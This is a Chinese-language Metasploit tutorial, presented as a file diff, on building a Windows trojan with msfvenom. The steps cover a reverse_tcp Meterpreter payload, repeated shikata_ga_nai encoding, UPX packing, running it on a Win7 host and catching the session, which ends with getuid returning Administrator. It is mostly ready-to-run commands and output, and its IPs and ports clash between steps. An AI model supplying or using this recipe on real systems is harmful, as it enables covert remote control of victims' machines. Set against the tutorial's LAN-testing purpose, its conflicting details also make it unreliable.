@@ -1,0 +1,104 @@
+一,目的:熟悉msfvenom生成木马程序过程,并执行和监听控制.
+
+二,工具:MSF
+
+三,原理:msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线
+
+四,过程:
+
+1,查看帮助
+
+     命令: root# msfvenom -h
+ 
+     结果:
+      MsfVenom - a Metasploit standalone payload generator.
+      Also a replacement for msfpayload and msfencode.
+      Usage: /usr/bin/msfvenom [options] <var=val>
+      
+      Options:
+          -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, formats, all
+          -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
+              --list-options               List --payload <value>'s standard, advanced and evasion options
+          -f, --format          <format>   Output format (use --list formats to list)
+          -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
+              --smallest                   Generate the smallest possible payload using all available encoders
+          -a, --arch            <arch>     The architecture to use for --payload and --encoders
+              --platform        <platform> The platform for --payload (use --list platforms to list)
+          -o, --out             <path>     Save the payload to a file
+          -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
+          -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
+          -s, --space           <length>   The maximum size of the resulting payload
+              --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
+          -i, --iterations      <count>    The number of times to encode the payload
+          -c, --add-code        <path>     Specify an additional win32 shellcode file to include
+          -x, --template        <path>     Specify a custom executable file to use as a template
+          -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
+          -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
+          -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
+          -h, --help                       Show this message
+
+
+
+3,现在设置LHOST,即监听主机IP和LPORT监听端口,我是本地局域网测试,所以IP是192.168.1.113,端口设置成55555.所以最后连接会通向192.168.1.113的55555端口
+
+命令: root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.14.214 LPORT=55555 -f exe > /root/test1.exe
+
+注:如果只是用msfpayload生成,简单示例:
+
+命令: root # msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.14.214 X > Desktop/test1.exe
+
+upx加壳：upx -5 /root/Desktop/acn.exe
+
+结果:
+root@kali:~# upx -5 /root/test1.exe 
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2017
+UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+     73802 ->     48128   65.21%    win32/pe     test1.exe                     
+
+Packed 1 file.
+
+说明:  
+-p payload
+
+-e 编码方式
+
+-i 编码次数
+
+-b 在生成的程序中避免出现的值
+
+LHOST,LPORT 监听上线的主机IP和端口
+
+-f exe 生成EXE格式
+
+4,把生成的test1放到win7下.执行.
+
+5,在命令行下,打开msfconsole.
+
+命令: root # msfconsole
+
+6,本机监听,因为之前用的是reverse_tcp,所以设置如下
+
+命令: msf > use exploit/multi/handler
+
+Msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+
+结果:
+
+7,现在快完成了,设置LHOST,LPORT,并执行exploit,会发现有连接进来.
+msf exploit(multi/handler) > set LHOST 192.168.14.214
+LHOST => 192.168.14.214
+msf exploit(multi/handler) > set LPORT 44444
+LPORT => 44444
+msf exploit(multi/handler) > exploit 
+[*] Started reverse TCP handler on 192.168.14.214:44444 
+[*] Sending stage (179779 bytes) to 192.168.14.68
+[*] Meterpreter session 4 opened (192.168.14.214:44444 -> 192.168.14.68:62829) at 2018-08-16 18:03:37 +0800
+
+meterpreter > getuid
+Server username: 瑾川\Administrator   #over
+
+
